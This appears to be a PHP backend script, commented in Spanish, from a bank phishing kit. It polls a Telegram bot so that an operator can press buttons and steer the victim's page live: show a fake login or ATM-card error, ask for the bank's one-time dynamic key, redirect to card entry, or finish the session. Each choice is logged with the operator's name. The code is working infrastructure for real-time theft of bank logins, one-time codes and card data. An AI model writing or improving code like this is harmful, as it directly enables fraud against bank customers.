<?php
session_start();
header('Content-Type: application/json');

$configPath = __DIR__ . '/../../config.php';
if (!file_exists($configPath)) {
    echo json_encode(['action' => null, 'error' => 'Falta config.php']);
    exit;
}

$config = require $configPath;

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (!$transactionId || !$messageId) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// Verificación por sesión (webhook)
if (
    isset($_SESSION['current_transaction'], $_SESSION['current_action']) &&
    $_SESSION['current_transaction'] === $transactionId
) {
    $act = $_SESSION['current_action'];
    unset($_SESSION['current_transaction'], $_SESSION['current_action']);
    echo json_encode(['action' => $act]);
    exit;
}

// Obtener actualizaciones de Telegram
$offset = $_SESSION['last_update_id'] ?? 0;
$url = "https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;

if (!empty($data['result'])) {
    foreach ($data['result'] as $update) {

        $_SESSION['last_update_id'] = $update['update_id'];

        if (!isset($update['callback_query']['data'])) continue;
        if (strpos($update['callback_query']['data'], $transactionId) === false) continue;

        list($actionType) = explode(":", $update['callback_query']['data']);

        // ACCIONES PERMITIDAS
        $allowed = [
            'error_logo',
            'error_cajero',
            'pedir_dinamica',
            'error_dinamica',
            'confirm_finalizar',
            'tarjeta'
        ];

        if (!in_array($actionType, $allowed)) continue;

        $action = $actionType;

        // TEXTO HUMANO
        $accionHumana = match($actionType) {
            'error_logo' => 'Error de LOGO',
            'error_cajero' => 'Error de CAJERO',
            'pedir_dinamica' => 'Pedir DINÁMICA',
            'error_dinamica' => 'Error de DINÁMICA',
            'confirm_finalizar' => 'FINALIZAR',
            'tarjeta' => 'Redirigir a TARJETA',
            default => 'Acción desconocida'
        };

        // NOMBRE DEL OPERADOR
        $oper = $update['callback_query']['from']['username']
            ?? $update['callback_query']['from']['first_name']
            ?? 'Desconocido';

        // TEXTO ORIGINAL
        $oldText = $update['callback_query']['message']['text'] ?? '';

        // NUEVO TEXTO
        $newText = $oldText .
            "\n\n<b>✅ Acción:</b> {$accionHumana}" .
            "\n<b>👤 Operador:</b> @{$oper}";

        // EDITAR MENSAJE CON TRAZA
        $payload = [
            'chat_id' => $config['chat_id'],
            'message_id' => $messageId,
            'text' => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
        curl_close($ch);

        break;
    }
}

echo json_encode(['action' => $action]);
